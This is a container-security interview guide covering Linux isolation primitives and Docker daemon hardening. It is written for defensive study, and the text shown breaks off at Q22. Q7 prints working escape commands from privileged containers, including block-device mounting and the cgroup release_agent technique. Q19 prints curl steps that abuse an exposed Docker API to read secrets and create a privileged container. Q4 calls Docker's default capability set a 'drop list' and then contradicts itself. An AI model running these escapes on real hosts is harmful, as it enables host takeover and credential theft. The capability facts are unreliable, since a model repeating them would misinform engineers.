# 100 Senior-Level Cloud · Docker · containerd Security Interview Questions & Answers

> **Audience:** Staff/Principal Engineers, Platform Security Engineers, Cloud-Native Architects  
> **Scope:** Docker Engine, containerd, OCI spec, Linux kernel primitives, cloud-native supply chain, runtime security, Kubernetes integration  
> **Format:** Question → Core concept tags → Detailed answer

---

## Table of Contents

1. [Linux Kernel Primitives (Q1–15)](#section-1-linux-kernel-primitives)
2. [Docker Engine & Daemon Security (Q16–30)](#section-2-docker-engine--daemon-security)
3. [containerd & OCI Runtime Security (Q31–45)](#section-3-containerd--oci-runtime-security)
4. [Image & Supply Chain Security (Q46–60)](#section-4-image--supply-chain-security)
5. [Network Security (Q61–70)](#section-5-network-security)
6. [Secrets & Credential Management (Q71–78)](#section-6-secrets--credential-management)
7. [Runtime Threat Detection (Q79–86)](#section-7-runtime-threat-detection)
8. [Kubernetes + Container Security (Q87–94)](#section-8-kubernetes--container-security)
9. [Compliance, Auditing & Hardening (Q95–100)](#section-9-compliance-auditing--hardening)

---

## Section 1: Linux Kernel Primitives

---

### Q1. What Linux kernel primitives underpin container isolation, and what are the security boundaries of each?

**Tags:** `namespaces` `cgroups` `seccomp` `capabilities` `LSM`

**Answer:**

Containers are not a kernel feature — they are a _composition_ of several independent kernel features, each providing a different isolation axis:

| Primitive | Isolation Axis | Security Boundary |
|-----------|---------------|-------------------|
| **Namespaces** | Resource visibility | Hides kernel objects (PIDs, net, mounts, users) from other namespaces; does NOT enforce access control |
| **cgroups v1/v2** | Resource accounting & throttling | Limits CPU/mem/IO; does NOT prevent syscalls |
| **Capabilities** | Privilege decomposition | Splits root into ~40 granular privileges; container gets a reduced capability set |
| **Seccomp-BPF** | Syscall filtering | Allows/denies syscalls via eBPF bytecode; reduces kernel attack surface |
| **LSM (AppArmor / SELinux)** | Mandatory access control | Label-based policy; enforced by kernel even if container process is root |
| **User Namespaces** | UID/GID remapping | Maps container root (UID 0) to unprivileged host UID; breaks many privilege-escalation paths |
| **Rootless containers** | Daemon privilege reduction | All of the above run without a privileged daemon |

**Key insight:** These primitives are _additive defense-in-depth_. A kernel vulnerability can bypass namespaces; capabilities misconfiguration can bypass seccomp; a missing LSM policy can bypass capabilities. Proper hardening requires **all layers simultaneously**.

**Common pitfalls:**
- Thinking `--privileged` only adds capabilities — it actually drops seccomp, AppArmor, mounts `/dev` read-write, and gives `CAP_SYS_ADMIN`.
- cgroups v1 has known escape paths (e.g., the `devices` controller bypass). Prefer cgroups v2 unified hierarchy.
- Namespace isolation alone is not a security boundary — see container escape via `runc` CVE-2019-5736.

---

### Q2. Explain Linux namespaces in depth. Which namespaces does Docker create by default, and which does it NOT create?

**Tags:** `namespaces` `pid-ns` `net-ns` `user-ns`

**Answer:**

Linux has **8 namespace types** (as of kernel 5.6+):

| Namespace | Flag | Isolates |
|-----------|------|----------|
| `mnt` | `CLONE_NEWNS` | Mount points, filesystem topology |
| `uts` | `CLONE_NEWUTS` | Hostname, NIS domain name |
| `ipc` | `CLONE_NEWIPC` | SysV IPC, POSIX message queues |
| `pid` | `CLONE_NEWPID` | PID number space (container PID 1) |
| `net` | `CLONE_NEWNET` | Network interfaces, routing tables, iptables |
| `user` | `CLONE_NEWUSER` | UID/GID mapping |
| `cgroup` | `CLONE_NEWCGROUP` | cgroup root visibility |
| `time` | `CLONE_NEWTIME` | CLOCK_MONOTONIC/BOOTTIME offsets (kernel 5.6+) |

**Docker default container creates:** `mnt`, `uts`, `ipc`, `pid`, `net`, `cgroup`

**Docker does NOT create by default:** `user` namespace — this is the most security-critical omission. Container root (UID 0) maps directly to host root (UID 0). A container escape gives full host root access.

**Enable user namespace remapping:**
```bash
# /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```
This creates a `dockremap` user and maps container UID 0 → host UID 165536, dramatically limiting container escape blast radius.

**PID namespace deep-dive:** Container PID 1 receives `SIGKILL` if the namespace's init exits. Improper PID 1 handling (no signal reaping) causes zombie processes — use `tini` or `dumb-init`.

---

### Q3. How does cgroups v2 differ from v1 in the context of container security?

**Tags:** `cgroups` `resource-limits` `container-escape`

**Answer:**

**cgroups v1 problems:**
- Multiple hierarchy trees (one per controller: `memory`, `cpu`, `devices`, etc.) mounted separately under `/sys/fs/cgroup/<controller>/`
- No unified ownership model — a process can be in different groups in different hierarchies
- The `devices` controller in v1 has a known container escape technique: if a container can write to `/sys/fs/cgroup/devices/`, it can grant itself access to host block devices
- No `memory.oom.group` — OOM killer targets individual tasks, not the whole cgroup tree

**cgroups v2 improvements:**
- Single unified hierarchy under `/sys/fs/cgroup/`
- **Delegation model:** unprivileged processes can safely manage sub-hierarchies via `cgroup.subtree_control`
- **`nsdelegate` mount option:** prevents containers from escaping their cgroup via `CLONE_NEWCGROUP`; cgroup namespace root is pinned at container's own cgroup
- `memory.oom.group = 1` kills the entire container on OOM, not random tasks
- `io.latency` / `io.weight` replace blkio (more predictable)
- PSI (Pressure Stall Information): real-time resource pressure metrics

**Check which version is active:**
```bash
stat -f -c %T /sys/fs/cgroup
# Returns "cgroup2fs" for v2, "tmpfs" for v1
```

**Kubernetes:** Requires `SystemdCgroup = true` in containerd config and `--cgroup-driver=systemd` on kubelet for full v2 support.

---

### Q4. What are Linux capabilities, and how does Docker/containerd reduce the default capability set?

**Tags:** `capabilities` `CAP_NET_ADMIN` `CAP_SYS_ADMIN` `privilege-escalation`

**Answer:**

Linux capabilities split the monolithic `root` privilege into ~40 discrete units. Each process thread has:
- **Permitted** set: maximum capabilities the thread can have
- **Effective** set: capabilities currently active
- **Inheritable** set: capabilities inherited across `execve`
- **Bounding** set: upper limit; capabilities cannot be added above this
- **Ambient** set (kernel 4.3+): inherited by unprivileged `execve`

**Docker default capability drop list (from `runc` defaults):**
Docker _drops_ these from the full root set:
`CAP_AUDIT_WRITE`, `CAP_CHOWN`, `CAP_DAC_OVERRIDE`, `CAP_FOWNER`, `CAP_FSETID`, `CAP_KILL`, `CAP_MKNOD`, `CAP_NET_BIND_SERVICE`, `CAP_NET_RAW`, `CAP_SETFCAP`, `CAP_SETGID`, `CAP_SETPCAP`, `CAP_SETUID`, `CAP_SYS_CHROOT`

**What containers keep by default (the dangerous ones):**
- `CAP_NET_RAW` — allows raw socket creation, ARP/ICMP spoofing → **drop this**
- `CAP_NET_BIND_SERVICE` — allows binding ports < 1024

**Hardening:**
```bash
# Drop all, add only what's needed
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE nginx
```

**`CAP_SYS_ADMIN` is the new root:** It allows mount operations, `ptrace`, `perf_event_open`, `setns`, `ioctl` for device management. Never grant it unless absolutely necessary.

**Check capabilities of a running container:**
```bash
cat /proc/1/status | grep -i cap
# Parse with: capsh --decode=<hex>
```

---

### Q5. How does seccomp-BPF work in Docker, and what is the default seccomp profile?

**Tags:** `seccomp` `BPF` `syscall-filtering` `kernel-hardening`

**Answer:**

**Mechanism:**
1. A seccomp filter is a BPF (Berkeley Packet Filter) program loaded via `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)`
2. On every syscall, the kernel runs the BPF program before executing the syscall
3. The filter returns an action: `ALLOW`, `ERRNO(n)`, `KILL_PROCESS`, `TRAP`, `LOG`, `TRACE`
4. Filters are inherited by child processes and **cannot be relaxed**, only further restricted

**Docker's default seccomp profile** blocks ~44 syscalls including:
- `kexec_load` — load new kernel
- `ptrace` — process tracing (blocked by default, dangerous for debugging)
- `mount` — filesystem mount
- `add_key`, `keyctl`, `request_key` — kernel keyring
- `unshare` — create new namespaces (blocks namespace escapes)
- `clone` with `CLONE_NEWUSER`
- `setns` — join other namespaces
- `reboot`
- `init_module`, `finit_module`, `delete_module` — kernel modules

**Profile format:**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    { "names": ["read", "write", "open"], "action": "SCMP_ACT_ALLOW" }
  ]
}
```

**Apply custom profile:**
```bash
docker run --security-opt seccomp=/path/to/profile.json myimage
```

**Disable seccomp (dangerous):**
```bash
docker run --security-opt seccomp=unconfined myimage
```

**`--privileged` disables seccomp entirely** — this is one of its most dangerous side effects.

---

### Q6. Explain the container escape via `runc` CVE-2019-5736. What was the root cause, and how was it fixed?

**Tags:** `runc` `CVE` `container-escape` `file-descriptor`

**Answer:**

**CVE-2019-5736** allowed a malicious container to overwrite the host `runc` binary, achieving host root code execution.

**Root cause:**
`runc` opens `/proc/self/exe` to re-execute itself for container setup. A malicious container process could:
1. Open many file descriptors to `/proc/self/exe` (which resolves to the `runc` binary on the host)
2. Wait for the host to run `docker exec` into the container
3. During the brief window when `runc` is executing inside the container's PID namespace, overwrite `/proc/self/exe` via `/proc/<runc-pid>/exe` symlink
4. The overwritten `runc` binary now executes attacker-controlled code on the _host_

**The attack relies on:** `runc` keeping `/proc/self/exe` open and writable during container initialization while sharing the container's filesystem namespace.

**Fix:**
- `runc` now opens itself via a `/proc/self/fd/<n>` file descriptor using `O_PATH` (no write access)
- Uses `memfd_create` to create an anonymous in-memory copy of itself
- Executes from the memfd, which cannot be overwritten by container processes
- The host-side `runc` binary path is no longer reachable from inside the container

**Lessons:**
- `/proc/self/exe` is a dangerous pattern when crossing trust boundaries
- Container runtimes must handle the "runc inside container namespace" window carefully
- Always patch `runc` — it's the most privileged component in the container stack

---

### Q7. What is the `--privileged` flag in Docker, and enumerate every security boundary it removes?

**Tags:** `privileged` `security-boundary` `attack-surface`

**Answer:**

`--privileged` is the nuclear option. It removes the following protections:

| Protection | Normal Container | `--privileged` |
|-----------|-----------------|----------------|
| Capabilities | Reduced set (~14 caps) | **All capabilities granted** |
| Seccomp | Default profile active | **Disabled** |
| AppArmor | `docker-default` profile | **Disabled** |
| SELinux | Label enforced | **Disabled** |
| `/dev` access | Limited (`/dev/null`, `/dev/zero`, etc.) | **Full host `/dev` mounted** |
| Devices cgroup | Restricted | **All devices accessible** |
| `mknod` | Blocked | **Allowed** |
| Mount syscall | Blocked | **Allowed** |

**Host escape from `--privileged` container:**
```bash
# Inside privileged container:
# Mount host filesystem via block device
mkdir /mnt/host
mount /dev/sda1 /mnt/host
# Now you have the host filesystem
chroot /mnt/host
# You are now root on the host
```

**Alternative escape via cgroup v1:**
```bash
# Classic cgroup release_agent escape (Felix Wilhelm's technique)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > /output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Legitimate uses:** Docker-in-Docker (DinD) CI, privileged system tools. Prefer `--device` + specific `--cap-add` over `--privileged`.

---

### Q8. How does AppArmor work with Docker, and what does the default `docker-default` profile restrict?

**Tags:** `AppArmor` `LSM` `MAC` `docker-default`

**Answer:**

**AppArmor (Application Armor)** is a Linux Security Module (LSM) that enforces Mandatory Access Control via path-based profiles. The kernel calls AppArmor hooks on every security-sensitive operation regardless of process privileges.

**How Docker applies it:**
1. Docker daemon loads the `docker-default` profile on startup via `apparmor_parser`
2. When creating a container, `runc` calls `aa_change_onexec("docker-default")` before `execve` of the container entrypoint
3. The profile is enforced by the kernel — container root cannot disable it

**`docker-default` profile key restrictions:**
```
# Deny write to dangerous paths
deny @{PROC}/sys/kernel/{?,??,[^s][^h][^m]**} wklx
deny @{PROC}/sys/kernel/shm* wklx

# Deny ptrace of other processes
deny ptrace (trace) peer=docker-default,

# Deny mount
deny mount,

# Deny writes to /proc (except own)
deny @{PROC}/{[^1-9],[^1-9][^0-9],...}/** w,

# Restrict signals
signal (send) set=(kill,term,...) peer=docker-default,
```

**Inspect active profile:**
```bash
docker inspect <container> | jq '.[].HostConfig.SecurityOpt'
# Should show: "apparmor=docker-default"

# Inside container:
cat /proc/self/attr/current
# Shows: docker-default (enforce)
```

**Custom profile for production:**
```bash
# Create tighter profile
cat > /etc/apparmor.d/myapp << 'EOF'
#include <tunables/global>
profile myapp flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  network inet tcp,
  /app/binary mr,
  /tmp/ rw,
  deny /proc/** w,
  deny /sys/** w,
}
EOF
apparmor_parser -r /etc/apparmor.d/myapp
docker run --security-opt apparmor=myapp myimage
```

---

### Q9. Explain SELinux MCS (Multi-Category Security) labeling in the context of containers.

**Tags:** `SELinux` `MCS` `label` `container-isolation`

**Answer:**

On SELinux-enabled systems (RHEL, Fedora, CentOS), each container gets a unique **MCS label** that prevents one container from accessing another's resources even if they share the same SELinux type.

**Label structure:** `system_u:system_r:container_t:s0:c123,c456`
- `container_t` — the SELinux type for containers
- `s0:c123,c456` — the MCS category pair (2 categories from 0–1023)
- Number of unique pairs: C(1024,2) = 523,776 — enough for all containers on a host

**What MCS enforces:**
- Container A with `c1,c2` cannot read/write files labeled `c3,c4`
- Container processes cannot `ptrace` processes in different MCS categories
- Volume mounts automatically get the container's label (with `:z` or `:Z` option)

**Volume labeling:**
```bash
# :z — shared label (all containers can access)
docker run -v /data:/data:z myimage

# :Z — private label (only this container)
docker run -v /data:/data:Z myimage
```

**Without `:z`/`:Z`:** SELinux denies access to the volume because the host directory label (`user_home_t` or similar) doesn't match `container_t`. This manifests as silent `Permission denied` inside the container.

**Verify labels:**
```bash
ls -Z /data           # host label
docker inspect <c> | grep -i selinux
ps -eZ | grep container  # process label
```

---

### Q10. What is a kernel exploit, and what mechanisms exist to prevent container-to-host kernel exploits?

**Tags:** `kernel-exploit` `defense-in-depth` `gVisor` `Kata`

**Answer:**

A **kernel exploit** uses a vulnerability in the Linux kernel to escalate privileges or escape isolation. Since all containers share the host kernel, a single kernel CVE can compromise every container on the host.

**Attack chain:** Container process → syscall with malicious payload → kernel vulnerability triggered → kernel memory corruption → arbitrary code execution as kernel → host compromise.

**Mitigation layers:**

1. **Seccomp** — reduces syscall attack surface. If `io_uring` has a vuln, block `io_uring`. Cuts reachable kernel code by 30–50%.

2. **Capabilities** — prevents privilege escalation paths that require specific caps (e.g., `CAP_SYS_MODULE` needed for `init_module`)

3. **Kernel hardening options:**
   ```
   CONFIG_SECURITY_LOCKDOWN_LSM=y    # lockdown mode
   CONFIG_HARDENED_USERCOPY=y        # validates kernel↔user copies
   CONFIG_STACKPROTECTOR_STRONG=y    # stack canaries
   CONFIG_RANDOMIZE_BASE=y           # KASLR
   CONFIG_PAGE_TABLE_ISOLATION=y     # KPTI (Meltdown mitigation)
   ```

4. **gVisor (runsc):** Implements a Go-based userspace kernel (Sentry). Container syscalls go to Sentry, not the host kernel. Sentry itself uses a minimal host syscall surface. Tradeoff: ~20-40% performance overhead, syscall compatibility gaps.

5. **Kata Containers:** Each container runs in a lightweight VM (QEMU/cloud-hypervisor/Firecracker). Hardware virtualization boundary. Near-zero kernel sharing. Overhead: VM startup latency, higher memory.

6. **eBPF-based LSM (BPF LSM, kernel 5.7+):** Programmable security policies without kernel module compilation.

7. **Regular kernel patching** — the most important mitigation. Automate with `unattended-upgrades` or RHEL live patching (`kpatch`).

---

### Q11. What is a "dirty cow" class of vulnerability, and how do namespaces/capabilities fail to prevent it?

**Tags:** `CVE-2016-5195` `copy-on-write` `kernel-race` `privilege-escalation`

**Answer:**

**CVE-2016-5195 (Dirty COW):** A race condition in the Linux kernel's memory management (Copy-On-Write) subsystem allowed unprivileged processes to write to read-only memory mappings.

**The race:**
1. `mmap()` a read-only file (e.g., `/etc/passwd`)
2. Race between `MADV_DONTNEED` (drops the page) and `write()` via `/proc/self/mem`
3. The kernel's COW path is bypassed — write lands in the original file's page, not a private copy
4. Unprivileged process writes to `/etc/passwd` → adds root user → host escape

**Why namespaces fail:**
- Mount namespace isolates the view but not the kernel's page cache
- The vulnerability is in the kernel's VMA (Virtual Memory Area) fault handler
- No namespace concept exists at the page fault level

**Why seccomp partially helps:**
- Seccomp can block `madvise(MADV_DONTNEED)` — but this breaks legitimate apps
- Cannot block `write()` to `/proc/self/mem` easily without breaking debugging

**Why user namespaces worsen it:**
- CVE-2016-5195 was exploitable even from inside user namespaces
- User namespaces actually increase kernel attack surface (more code paths activated)

**Lesson:** Kernel CVEs of this class require **kernel patches**. No userspace isolation primitive prevents them. This is the core argument for VM-level isolation (Kata/Firecracker).

---

### Q12. Explain eBPF security — both as a security tool and as an attack surface.

**Tags:** `eBPF` `Falco` `Tetragon` `kernel-attack-surface`

**Answer:**

**eBPF as a security tool:**
- **Tracing:** Attach to kprobes/tracepoints to observe container syscalls, network connections, file access without modifying container code
- **Runtime security:** Tools like **Falco**, **Tetragon**, **Cilium** use eBPF for policy enforcement and anomaly detection
- **Network policy:** Cilium enforces L3/L4/L7 policy entirely in eBPF, bypassing iptables overhead
- **Audit:** Low-overhead audit trail vs. `auditd`

**eBPF as attack surface:**

1. **Verifier bugs:** The eBPF verifier ensures programs are safe before loading. Verifier CVEs (e.g., CVE-2021-3490, CVE-2022-23222) allow privilege escalation from unprivileged eBPF.

2. **JIT compiler bugs:** Architecture-specific JIT compiler errors can produce exploitable machine code.

3. **Helper function bugs:** `bpf_probe_write_user()` can write to arbitrary userspace addresses.

4. **`CAP_BPF` / `CAP_NET_ADMIN`:** Loading eBPF requires privileges. Granting these caps to containers expands attack surface significantly.

**Hardening:**
```bash
# Restrict unprivileged eBPF (kernel 5.10+)
sysctl -w kernel.unprivileged_bpf_disabled=1

# Restrict perf events (eBPF dependency)
sysctl -w kernel.perf_event_paranoid=3

# Lock down eBPF in lockdown mode
echo integrity > /sys/kernel/security/lockdown
```

**Production recommendation:** Enable `kernel.unprivileged_bpf_disabled=1`. Only grant `CAP_BPF` to trusted security tooling pods, not application containers.

---

### Q13. How does `ptrace` create a container security risk, and how do you mitigate it?

**Tags:** `ptrace` `process-injection` `seccomp` `capabilities`

**Answer:**

`ptrace(2)` allows a process to observe and control another process — read/write memory, intercept syscalls, inject code. It is the foundation of debuggers (`gdb`, `strace`, `dlv`).

**Container risks:**

1. **Cross-container ptrace:** In the absence of PID namespace isolation, container A can ptrace container B's processes (if they share a PID namespace).

2. **Compromised container → ptrace other containers:** If a container has `CAP_SYS_PTRACE` and PID visibility, it can dump memory of other containers (credential theft).

3. **ptrace-based container escapes:** Some escape techniques use ptrace to inject shellcode into a process running outside the container namespace.

4. **`/proc/<pid>/mem` writes:** Even without `ptrace`, writing to `/proc/<pid>/mem` of a host process (if accessible) allows code injection.

**Mitigations:**

```bash
# 1. Seccomp: block ptrace syscall (Docker default blocks it)
# In custom profile:
{ "names": ["ptrace"], "action": "SCMP_ACT_ERRNO" }

# 2. Remove CAP_SYS_PTRACE (not in default cap set)
docker run --cap-drop=ALL myimage

# 3. PID namespace isolation (default in Docker)
# Verify: container process PID 1 is isolated

# 4. Yama ptrace_scope
sysctl -w kernel.yama.ptrace_scope=2  # admin-only ptrace
# 0=classic, 1=restricted, 2=admin-only, 3=no attach

# 5. AppArmor/SELinux deny ptrace rules
```

---

### Q14. What is the OOM (Out-of-Memory) killer, and how do container memory limits interact with it?

**Tags:** `OOM-killer` `cgroups` `memory-limits` `reliability`

**Answer:**

**OOM killer** is a kernel mechanism that selects and kills processes when the system runs out of physical memory + swap. Selection is based on `oom_score` (0-1000, higher = more likely to be killed).

**Container memory limits via cgroups:**

```bash
docker run --memory=512m --memory-swap=512m myapp
# --memory: hard limit on RSS
# --memory-swap: total (RSS + swap). Setting equal to --memory disables swap.
# --memory-swappiness: 0-100, tendency to swap (default 60, set 0 for latency-sensitive)
# --oom-kill-disable: (dangerous) disables OOM kill for this container
# --oom-score-adj: adjusts OOM priority (-1000 to 1000)
```

**cgroups v1 OOM behavior:**
- OOM killer targets individual tasks within the cgroup
- Can kill unrelated processes that happen to have high `oom_score`
- Memory limit breach → kernel OOM event → single process killed → container may continue running in broken state

**cgroups v2 OOM behavior:**
```bash
echo 1 > /sys/fs/cgroup/mycontainer/memory.oom.group
```
With `memory.oom.group=1`, the OOM killer kills the **entire cgroup** (all container processes) when the limit is breached. This is safer — no broken-state containers.

**Security implications:**
- `--oom-kill-disable` can cause host-wide memory exhaustion → host OOM kills system processes → denial of service
- Containers without memory limits can starve neighbors (noisy neighbor problem)
- **Always set `--memory` limits in production**

---

### Q15. What is the `user namespace` remapping feature in Docker, and what are its limitations?

**Tags:** `user-namespace` `UID-remapping` `rootless` `privilege-reduction`

**Answer:**

**User namespace remapping** maps container UIDs/GIDs to a range of unprivileged host UIDs.

**Configuration:**
```json
// /etc/docker/daemon.json
{
  "userns-remap": "default"
}
```
Creates `/etc/subuid` and `/etc/subgid` entries for `dockremap`:
```
dockremap:165536:65536
```
Container UID 0 → host UID 165536. Container UID 1000 → host UID 166536.

**Security benefit:**
- File created by container root → owned by UID 165536 on host (unprivileged)
- Container escape gives attacker UID 165536 on host, not root
- `/etc/shadow`, SSH keys, root-owned files are inaccessible

**Limitations:**

1. **Shared volumes break:** Host files owned by root (UID 0) appear owned by `nobody` (65534) or are inaccessible inside the container. Requires `chown` or bind-mount adjustment.

2. **No isolation between containers:** All containers share the same UID range (`165536-231071`). Container A root and Container B root both map to 165536.

3. **Incompatible with `--privileged`:** `--privileged` disables user namespace remapping.

4. **incompatible with some images:** Images that `chown` files to specific UIDs during build break.

5. **`CAP_SYS_ADMIN` within user namespace:** Still allows mounting, namespace creation — some escape paths remain.

**Rootless containers (Podman/rootless Docker):** Go further — the daemon itself runs as an unprivileged user, not just the containers.

---

## Section 2: Docker Engine & Daemon Security

---

### Q16. What is the Docker daemon's attack surface, and how do you harden the Docker socket?

**Tags:** `docker-socket` `daemon-security` `TLS` `authorization`

**Answer:**

The Docker daemon (`dockerd`) is a root-privileged process that:
- Manages container lifecycle (create, start, stop, delete)
- Manages images, networks, volumes
- Exposes a REST API via Unix socket `/var/run/docker.sock` or TCP

**Attack surface:**

| Interface | Default | Risk |
|-----------|---------|------|
| Unix socket `/var/run/docker.sock` | Active, root-owned | Any process with socket access = root |
| TCP `0.0.0.0:2375` | Disabled | If enabled without TLS: unauthenticated root API |
| TCP `0.0.0.0:2376` (TLS) | Disabled | mTLS required |

**Hardening the Unix socket:**

```bash
# Socket permissions: owned root:docker, mode 660
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker ... /var/run/docker.sock

# Never mount the socket into containers (gives container root access)
# Bad pattern in CI (Jenkins, GitLab runners):
docker run -v /var/run/docker.sock:/var/run/docker.sock ci-image  # DANGEROUS
```

**Enable TCP with mutual TLS:**
```bash
# /etc/docker/daemon.json
{
  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2376"],
  "tls": true,
  "tlsverify": true,
  "tlscacert": "/certs/ca.pem",
  "tlscert": "/certs/server-cert.pem",
  "tlskey": "/certs/server-key.pem"
}
```

**Authorization plugins:**
```bash
# OPA-based authz plugin restricts API calls by policy
# /etc/docker/daemon.json
{ "authorization-plugins": ["opa-docker-authz"] }
```

**Alternative: Docker socket proxy (Tecnativa):**
Run a minimal proxy that exposes only specific Docker API endpoints to CI containers, blocking dangerous endpoints like `POST /containers/create`.

---

### Q17. Explain the Docker daemon's `--no-new-privileges` flag and its security implications.

**Tags:** `no-new-privileges` `setuid` `capabilities` `privilege-escalation`

**Answer:**

`--no-new-privileges` sets the `PR_SET_NO_NEW_PRIVS` bit via `prctl()` on the container process. Once set:

- `execve()` cannot gain new capabilities via setuid binaries (e.g., `sudo`, `su`, `ping`)
- `execve()` cannot gain capabilities via file capabilities (`getcap`)
- The bit is **inherited** by all child processes and **cannot be unset**
- AppArmor and seccomp profiles are enforced even on setuid binaries

**Why this matters:**
Without `--no-new-privileges`, a container with a setuid-root binary can escalate:
```bash
# Without no-new-privileges:
# Container has /usr/bin/newgrp (setuid root)
# Attacker calls newgrp → gains temporary root capabilities
# Uses root to escape container
```

**Enable globally:**
```json
// /etc/docker/daemon.json
{
  "no-new-privileges": true
}
```

**Per-container:**
```bash
docker run --security-opt no-new-privileges:true myimage
```

**containerd (CRI) equivalent:**
```yaml
# Pod Security Context in Kubernetes
securityContext:
  allowPrivilegeEscalation: false
```

**Caveat:** Some legitimate applications use setuid for privilege separation (e.g., `ping`, `sudo` for operational scripts). Audit all setuid binaries in your images:
```bash
find / -perm /4000 -type f 2>/dev/null
```

---

### Q18. How does the Docker Content Trust (DCT) mechanism work, and what are its cryptographic foundations?

**Tags:** `DCT` `Notary` `TUF` `image-signing` `supply-chain`

**Answer:**

**Docker Content Trust (DCT)** uses **Notary** (an implementation of **The Update Framework / TUF**) to cryptographically sign and verify image tags.

**TUF key hierarchy:**
```
Root key (offline, HSM)
  └── Targets key (signs content hashes)
  └── Snapshot key (signs repository state)
  └── Timestamp key (online, prevents replay attacks)
```

**Signing flow:**
```bash
export DOCKER_CONTENT_TRUST=1
export DOCKER_CONTENT_TRUST_SERVER=https://notary.docker.io

docker push myrepo/myimage:v1.0
# Prompts for root key passphrase
# Signs the image manifest digest
# Uploads signature to Notary server
```

**Verification flow:**
```bash
export DOCKER_CONTENT_TRUST=1
docker pull myrepo/myimage:v1.0
# Client fetches signed metadata from Notary
# Verifies signature chain: timestamp → snapshot → targets → root
# Computes manifest digest and compares
# Refuses to pull if signature is missing or invalid
```

**Cryptography:** Ed25519 for signing, SHA256/SHA512 for content hashes.

**Limitations of DCT:**
1. Only signs tags — image layers are not individually signed
2. Notary key management is complex (root key loss = game over)
3. Does not sign provenance (who built it, from what source)
4. Timestamp key is online → if Notary server is compromised, fake freshness

**Modern replacement:** **Sigstore/Cosign** (keyless signing via OIDC) + **in-toto attestations** for full provenance. See Q51.

---

### Q19. What information is exposed in the Docker API, and how can an attacker leverage it?

**Tags:** `docker-api` `information-disclosure` `lateral-movement`

**Answer:**

The Docker REST API exposes significant operational intelligence:

**Sensitive endpoints:**

| Endpoint | Data Exposed | Attacker Value |
|---------|-------------|----------------|
| `GET /info` | Docker version, OS, kernel, registry mirrors, plugins | Vulnerability targeting |
| `GET /containers/json?all=true` | All containers, labels, env vars, image names | Credential discovery via env vars |
| `GET /containers/{id}/inspect` | Full container config including env vars, mounts | Secrets in `ENV` statements |
| `GET /images/json` | All images with tags | Supply chain intelligence |
| `POST /containers/create` | Create arbitrary containers | Container escape, privilege escalation |
| `POST /containers/{id}/exec` | Execute commands in running containers | Code injection |
| `GET /volumes` | All volumes and mount paths | Data access paths |
| `GET /networks` | Network topology | Lateral movement planning |
| `GET /secrets` (Swarm) | Secret metadata (not values) | Existence mapping |
| `POST /build` | Build images from Dockerfile | Arbitrary code execution on build host |

**Real attack scenario:**
```bash
# Attacker gains access to exposed Docker API (2375/tcp or mounted socket)
# Step 1: enumerate
curl http://target:2375/containers/json | jq '.[].Names'
curl http://target:2375/containers/<id>/inspect | jq '.Config.Env'
# Step 2: Extract secrets from env vars
# Step 3: Spawn privileged container
curl -X POST http://target:2375/containers/create \
  -d '{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
```

**Mitigations:**
- Never expose `2375/tcp`
- mTLS on `2376/tcp`
- Authorization plugins (OPA)
- Network firewall: Docker API only accessible from management network

---

### Q20. Describe the Docker daemon's logging drivers and their security implications.

**Tags:** `logging` `audit` `log-injection` `SIEM`

**Answer:**

Docker supports multiple logging drivers that determine where container stdout/stderr goes:

| Driver | Storage | Security Consideration |
|--------|---------|----------------------|
| `json-file` (default) | Local JSON files | No auth, log rotation needed, disk exhaustion attack |
| `syslog` | syslogd/rsyslogd | Centralized, but UDP syslog is unauthenticated |
| `journald` | systemd journal | Binary format, tamper-evident (partial) |
| `fluentd` | Fluentd daemon | TLS support available |
| `splunk` | Splunk HTTP Event Collector | TLS + token auth |
| `awslogs` | CloudWatch | IAM auth, encrypted in transit |
| `gelf` | Graylog | UDP (unencrypted) by default |
| `none` | Discarded | **Never use in production** — no audit trail |

**Security concerns:**

1. **Log injection:** Container output containing ANSI escape sequences or newlines can corrupt log entries. Sanitize with structured logging (JSON).

2. **Sensitive data in logs:** Env vars printed to stdout, stack traces with passwords. Use structured logging and log scrubbing.

3. **Log rotation:** Default `json-file` has no rotation. Configure:
```json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "3"
  }
}
```

4. **Log tampering:** Local `json-file` logs can be modified by root. Send to immutable external system (CloudWatch, Splunk) immediately.

5. **Audit-grade logging:** Use `auditd` + Docker events API in parallel:
```bash
docker events --filter type=container --format '{{json .}}'
```

---

### Q21. What is the Docker daemon's `live-restore` feature, and does it have security implications?

**Tags:** `live-restore` `daemon-restart` `availability` `security`

**Answer:**

`live-restore` allows containers to continue running when the Docker daemon is stopped or restarted.

```json
// /etc/docker/daemon.json
{ "live-restore": true }
```

**How it works:**
- Daemon stores container state in `/var/lib/docker/containers/<id>/`
- On restart, daemon reconnects to existing `containerd-shim` processes (which keep containers alive)
- `containerd-shim` is the thin process that outlives the daemon

**Security implications:**

1. **Daemon updates without downtime:** Can apply daemon security patches without killing containers. This is a security positive — encourages timely patching.

2. **Orphaned shim processes:** If `live-restore` fails, shim processes run without daemon supervision — no resource limits enforcement from daemon perspective.

3. **Stale security policy:** If daemon is updated with new default seccomp/AppArmor profiles, existing containers (reconnected via live-restore) continue with old profiles. Requires container restart to get updated policies.

4. **containerd-shim attack surface:** During daemon downtime, `containerd-shim` is the only process managing the container. If shim is compromised, containerd provides no oversight.

**Recommendation:** Use `live-restore: true` in production for availability, but plan rolling container restarts after daemon security updates to ensure new profiles take effect.

---

### Q22. Explain the risks of building Docker images in CI/CD and how to mitigate them.

**Tags:** `CI/CD` `build-security` `DIND` `Kaniko` `BuildKit`

**Answer:**

**Risks in CI/CD image builds:**

1. **Docker-in-Docker (DinD):**
   - Requires `--privileged` CI container
